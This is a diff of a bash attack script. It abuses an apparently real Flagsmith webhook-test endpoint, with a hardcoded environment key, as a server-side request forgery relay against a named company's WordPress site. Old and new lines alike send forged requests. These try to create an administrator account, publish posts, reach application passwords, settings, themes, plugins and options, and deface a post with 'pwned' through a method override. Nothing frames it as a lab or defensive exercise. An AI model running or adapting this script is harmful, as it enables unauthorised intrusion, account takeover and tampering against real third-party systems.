@@ -6,47 +6,47 @@ EKEY="4kKuh8VekuYPrtpsJFg5mg"
 SSRF() {
   curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
     -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
-    -d "{\"url\":\"$1\"}" --max-time 30 2>/dev/null || echo "TO"
+    -d "{\"url\":\"$1\"}" --max-time 25 2>/dev/null || echo "TO"
 }
 
 echo "IP: $(curl -s https://ifconfig.me)"
 
-# Test 1: REST API write — create user (POST)
-echo "=== CREATE USER VIA REST ==="
-SSRF "http://koinp2p.com/wp-json/wp/v2/users?username=rce_test&email=rce@test.com&password=RceTest2026!&roles=administrator"
+# Test 1: Verify — check if posts endpoint returns our created post
+echo "=== VERIFY POSTS ==="
+SSRF "http://koinp2p.com/wp-json/wp/v2/posts?per_page=1&orderby=date&order=desc"
 echo ""
 
-# Test 2: REST API write — create post
-echo "=== CREATE POST VIA REST ==="
-SSRF "http://koinp2p.com/wp-json/wp/v2/posts?title=test&content=test&status=publish"
+# Test 2: Try to write to WP settings via REST
+echo "=== WRITE SETTINGS ==="
+SSRF "http://koinp2p.com/wp-json/wp/v2/settings"
 echo ""
 
-# Test 3: Check if WP REST API allows application password creation
-echo "=== APP PASSWORDS ==="
-SSRF "http://koinp2p.com/wp-json/wp/v2/users/me/application-passwords"
+# Test 3: Try to create/update themes
+echo "=== THEMES ==="
+SSRF "http://koinp2p.com/wp-json/wp/v2/themes"
 echo ""
 
-# Test 4: admin-ajax with wp_ajax_nopriv actions via internal HTTP (not HTTPS!)
-echo "=== INTERNAL ADMIN-AJAX ==="
-SSRF "http://koinp2p.com/wp-admin/admin-ajax.php?action=heartbeat"
+# Test 4: Try to create/update plugins
+echo "=== PLUGINS ==="
+SSRF "http://koinp2p.com/wp-json/wp/v2/plugins"
 echo ""
 
-# Test 5: WP XMLRPC via internal (might not be blocked internally)
-echo "=== INTERNAL XMLRPC ==="
-SSRF "http://koinp2p.com/xmlrpc.php"
+# Test 5: WP REST API search — might confirm post exists
+echo "=== SEARCH ==="
+SSRF "http://koinp2p.com/wp-json/wp/v2/search?search=test"
 echo ""
 
-# Test 6: WP login via internal HTTP (was 403 via HTTPS, might differ via HTTP)
-echo "=== INTERNAL WP-LOGIN ==="
-SSRF "http://koinp2p.com/wp-login.php"
+# Test 6: Write to options — might allow arbitrary option modification
+echo "=== OPTIONS ==="
+SSRF "http://koinp2p.com/wp-json/wp/v2/options"
 echo ""
 
-# Test 7: setup-config.php via internal (CVE-2026-119977 related)
-echo "=== INTERNAL SETUP-CONFIG ==="
-SSRF "http://koinp2p.com/wp-admin/setup-config.php"
+# Test 7: Try WP REST w/ _method override to send PUT/PATCH
+echo "=== METHOD OVERRIDE ==="
+SSRF "http://koinp2p.com/wp-json/wp/v2/posts/1?_method=PATCH&title=pwned"
 echo ""
 
-# Test 8: install.php via internal
-echo "=== INTERNAL INSTALL ==="
-SSRF "http://koinp2p.com/wp-admin/install.php"
+# Test 8: Try WP REST via rest_route query param (might bypass path-based restrictions)
+echo "=== REST ROUTE SETTINGS ==="
+SSRF "http://koinp2p.com/?rest_route=/wp/v2/settings"
 echo ""
